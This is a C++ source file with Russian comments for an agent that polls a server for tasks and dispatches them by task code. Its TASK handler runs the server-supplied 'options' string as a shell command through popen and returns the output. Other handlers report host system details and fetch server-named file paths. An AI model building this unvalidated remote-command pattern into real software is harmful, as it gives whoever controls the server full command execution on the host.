// polling.cpp - @t9tu0
// цикл опроса сервера, получение и выполнение заданий

#include "agent.h"
#include <iostream>
#include <thread>
#include <fstream>
#include <cstdio>
#include <memory>
#include <array>
#include <sys/utsname.h>

// Вспомогательная функция для выполнения команды и получения stdout
static std::string execute_command(const std::string& cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);
    if (!pipe) {
        return "Ошибка выполнения команды";
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

// Получение системной информации (ОС, версия ядра, имя хоста, архитектура)
static std::string get_system_info() {
    struct utsname info;
    if (uname(&info) != 0) {
        return "Не удалось получить системную информацию";
    }
    std::string result = "OS: " + std::string(info.sysname) + "\n";
    result += "Hostname: " + std::string(info.nodename) + "\n";
    result += "Release: " + std::string(info.release) + "\n";
    result += "Version: " + std::string(info.version) + "\n";
    result += "Machine: " + std::string(info.machine) + "\n";
    return result;
}

// парсит options и извлекает интервал
static int parse_interval_from_options(const std::string& options) {
    if (options.empty()) return -1;

    Logger::info("parse_interval_from_options вход: [" + options + "]");

    std::string parsed = options;

    // ШАГ 1: Удаляем экранирование кавычек: \" -> " (первый уровень)
    std::string unescaped;
    for (size_t i = 0; i < parsed.length(); ++i) {
        if (parsed[i] == '\\' && i + 1 < parsed.length() && parsed[i + 1] == '"') {
            unescaped += '"';
            i++;
        } else {
            unescaped += parsed[i];
        }
    }
    parsed = unescaped;

    Logger::info("После 1-го удаления экранирования: [" + parsed + "]");

    // ШАГ 2: Извлекаем значение ключа "options"
    auto inner_json = Json::get(parsed, "options");
    if (!inner_json) {
        auto interval_str = Json::get(parsed, "interval");
        if (interval_str) {
            Logger::info("Найден interval (без options): [" + *interval_str + "]");
            try {
                int val = std::stoi(*interval_str);
                if (val > 0) return val;
            } catch (...) {}
        }
        return -1;
    }

    Logger::info("Извлечен inner_json: [" + *inner_json + "]");

    // ШАГ 3: Удаляем экранирование внутри inner_json (второй уровень)
    std::string inner_unescaped;
    for (size_t i = 0; i < inner_json->length(); ++i) {
        if ((*inner_json)[i] == '\\' && i + 1 < inner_json->length() && (*inner_json)[i + 1] == '"') {
            inner_unescaped += '"';
            i++;
        } else {
            inner_unescaped += (*inner_json)[i];
        }
    }

    Logger::info("После 2-го удаления экранирования: [" + inner_unescaped + "]");

    // ШАГ 4: Удаляем экранирование в третий раз (если осталось)
    std::string final_unescaped;
    for (size_t i = 0; i < inner_unescaped.length(); ++i) {
        if (inner_unescaped[i] == '\\' && i + 1 < inner_unescaped.length() && inner_unescaped[i + 1] == '"') {
            final_unescaped += '"';
            i++;
        } else {
            final_unescaped += inner_unescaped[i];
        }
    }

    Logger::info("После 3-го удаления экранирования: [" + final_unescaped + "]");

    // ШАГ 5: Извлекаем значение interval
    auto interval_str = Json::get(final_unescaped, "interval");
    if (!interval_str) {
        // Пробуем найти interval в строке без кавычек
        size_t pos = final_unescaped.find("interval");
        if (pos != std::string::npos) {
            size_t colon = final_unescaped.find(":", pos);
            if (colon != std::string::npos) {
                size_t start = colon + 1;
                while (start < final_unescaped.size() && (final_unescaped[start] == ' ' || final_unescaped[start] == '"')) start++;
                size_t end = start;
                while (end < final_unescaped.size() && isdigit(final_unescaped[end])) end++;
                if (end > start) {
                    std::string val_str = final_unescaped.substr(start, end - start);
                    try {
                        int val = std::stoi(val_str);
                        if (val > 0) {
                            Logger::info("Найден interval (ручной парсинг): " + std::to_string(val));
                            return val;
                        }
                    } catch (...) {}
                }
            }
        }
        Logger::warn("Ключ 'interval' не найден");
        return -1;
    }

    Logger::info("Найден interval: [" + *interval_str + "]");
    try {
        int val = std::stoi(*interval_str);
        if (val > 0) {
            Logger::info("interval = " + std::to_string(val));
            return val;
        }
    } catch (const std::exception& e) {
        Logger::warn("Ошибка преобразования interval: " + std::string(e.what()));
    }

    return -1;
}

// если сервер передал интервал в поле options - применяем его
static void apply_interval_from_options(const std::string& options) {
    Logger::info("apply_interval_from_options вход: [" + options + "]");

    int new_interval = parse_interval_from_options(options);
    if (new_interval > 0 && new_interval != Config::POLL_INTERVAL_SEC) {
        Config::POLL_INTERVAL_SEC = new_interval;
        Logger::info("Интервал опроса изменён на " + std::to_string(new_interval) + " сек");

        // сохраняем в config.json
        std::ofstream file("config.json");
        if (file.is_open()) {
            file << "{\n";
            file << "    \"uid\": \"" << Config::AGENT_UID << "\",\n";
            file << "    \"description\": \"" << Config::AGENT_DESC << "\",\n";
            file << "    \"poll_interval_sec\": " << new_interval << "\n";
            file << "}\n";
            file.close();
            Logger::info("Конфигурация сохранена в config.json");
        } else {
            Logger::err("Не удалось открыть config.json для записи");
        }
    } else if (new_interval > 0) {
        Logger::info("Интервал уже равен " + std::to_string(new_interval) + " сек, изменение не требуется");
    } else {
        Logger::info("Интервал не найден или не положительный");
    }
}

// POST /api/wa_task/
// возвращает: 1 = задание есть, 0 = ждём, -2 = неверный код, -99 = ошибка
static int request_task(Task& out_task) {
    std::string url  = Config::BASE_URL + "/wa_task/";
    std::string body = Json::build({
        {"UID",         Config::AGENT_UID},
        {"descr",       Config::AGENT_DESC},
        {"access_code", g_state.access_code}
    });

    try {
        auto resp = Http::post(url, body);

        if (resp.status_code != 200) {
            Logger::err("HTTP ошибка при запросе задания: " + std::to_string(resp.status_code));
            return -99;
        }

        auto code_opt = Json::get(resp.body, "code_responce");
        if (!code_opt) {
            Logger::err("Не удалось разобрать ответ: " + resp.body);
            return -99;
        }

        int code = std::stoi(*code_opt);

        if (code == 1) {
            out_task.task_code  = Json::get(resp.body, "task_code") .value_or("");
            out_task.session_id = Json::get(resp.body, "session_id").value_or("");
            out_task.options    = Json::get(resp.body, "options")   .value_or("");
            out_task.status     = Json::get(resp.body, "status")    .value_or("");
            Logger::info("Получено задание: task_code=" + out_task.task_code
                         + " session_id=" + out_task.session_id);
            Logger::info("Options raw: [" + out_task.options + "]");
            return 1;
        } else if (code == 0) {
            Logger::info("Заданий нет");
            return 0;
        } else if (code == -2) {
            Logger::err("Неверный код доступа. Запускаем повторную регистрацию.");
            return -2;
        } else {
            Logger::warn("Неожиданный ответ сервера: " + resp.body);
            return -99;
        }
    } catch (const std::exception& e) {
        Logger::err(std::string("Сетевая ошибка: ") + e.what());
        return -99;
    }
}

// обработка задания типа CONF
static void handle_conf(const Task& task) {
    Logger::info("[CONF] Выполнение, session=" + task.session_id);
    send_result(task.session_id, 0, "конфигурация применена", {});
}

// обработка задания типа FILE
static void handle_file(const Task& task) {
    Logger::info("[FILE] Выполнение, session=" + task.session_id);

    std::vector<std::string> result_files;

    // ищем путь к файлу в options
    size_t pos = task.options.find("path");
    if (pos != std::string::npos) {
        size_t colon = task.options.find(":", pos);
        if (colon != std::string::npos) {
            size_t start = colon + 1;
            while (start < task.options.size() && (task.options[start] == ' ' || task.options[start] == '"')) start++;
            size_t end = start;
            while (end < task.options.size() && task.options[end] != '"' && task.options[end] != ',' && task.options[end] != '}') end++;
            std::string file_path = task.options.substr(start, end - start);

            Logger::info("[FILE] Путь: " + file_path);
            std::ifstream test(file_path);
            if (test.good()) {
                result_files.push_back(file_path);
                Logger::info("[FILE] Файл найден");
            } else {
                Logger::warn("[FILE] Файл не найден: " + file_path);
            }
        }
    }

    send_result(task.session_id, 0, "файл обработан", result_files);
}

// обработка задания типа TIMEOUT
static void handle_timeout(const Task& task) {
    Logger::info("[TIMEOUT] Выполнение, session=" + task.session_id);

    // ищем задержку
    size_t pos = task.options.find("delay");
    if (pos != std::string::npos) {
        size_t colon = task.options.find(":", pos);
        if (colon != std::string::npos) {
            size_t start = colon + 1;
            while (start < task.options.size() && (task.options[start] == ' ' || task.options[start] == '"')) start++;
            size_t end = start;
            while (end < task.options.size() && isdigit(task.options[end])) end++;
            try {
                int delay = std::stoi(task.options.substr(start, end - start));
                Logger::info("[TIMEOUT] Ожидание " + std::to_string(delay) + " сек");
                std::this_thread::sleep_for(std::chrono::seconds(delay));
            } catch (...) {}
        }
    }

    send_result(task.session_id, 0, "таймаут выполнен", {});
}

// обработка задания типа TASK
static void handle_task(const Task& task) {
    Logger::info("[TASK] Выполнение, session=" + task.session_id);

    std::string result_message;

    if (!task.options.empty()) {
        // Если options не пуст, интерпретируем как команду
        Logger::info("[TASK] Выполняем команду: " + task.options);
        result_message = execute_command(task.options);
        if (result_message.empty()) {
            result_message = "Команда выполнена, вывод отсутствует.";
        }
        Logger::info("[TASK] Команда завершена, отправляем результат");
    } else {
        // Иначе возвращаем системную информацию
        Logger::info("[TASK] Сбор системной информации");
        result_message = get_system_info();
    }

    send_result(task.session_id, 0, result_message, {});
}

// диспетчер - по task_code выбираем обработчик
using TaskHandler = std::function<void(const Task&)>;
static const std::map<std::string, TaskHandler> HANDLERS = {
    { "CONF", handle_conf },
    { "FILE", handle_file },
    { "TIMEOUT", handle_timeout },
    { "TASK", handle_task }
};

static void execute_task(const Task& task) {
    Logger::info("Выполняю task_code=" + task.task_code + " session=" + task.session_id);

    // проверяем не хочет ли сервер изменить интервал опроса
    apply_interval_from_options(task.options);

    auto it = HANDLERS.find(task.task_code);
    if (it != HANDLERS.end()) {
        it->second(task);
    } else {
        Logger::warn("Неизвестный task_code='" + task.task_code + "'");
        send_result(task.session_id, -1, "неизвестный task_code: " + task.task_code, {});
    }
}

// повторная регистрация если сервер вернул -2
static bool try_reregister() {
    g_state.reset();

    for (int attempt = 1; attempt <= Config::MAX_REG_RETRIES; ++attempt) {
        Logger::info("Повторная регистрация: попытка " + std::to_string(attempt));
        if (register_agent()) {
            Logger::info("Повторная регистрация успешна.");
            return true;
        }
        std::this_thread::sleep_for(std::chrono::seconds(attempt * 5));
    }

    Logger::crit("Повторная регистрация не удалась");
    return false;
}

// главный цикл - вызывается из main()
void polling_loop() {
    Logger::info("Цикл опроса запущен, интервал " + std::to_string(Config::POLL_INTERVAL_SEC) + " сек");

    while (true) {
        Task task;
        int result = request_task(task);

        if (result == 1) {
            execute_task(task);
        } else if (result == -2) {
            if (!try_reregister()) {
                Logger::crit("Не удалось восстановить доступ");
                return;
            }
            continue;
        }

        std::this_thread::sleep_for(std::chrono::seconds(Config::POLL_INTERVAL_SEC));
    }
}
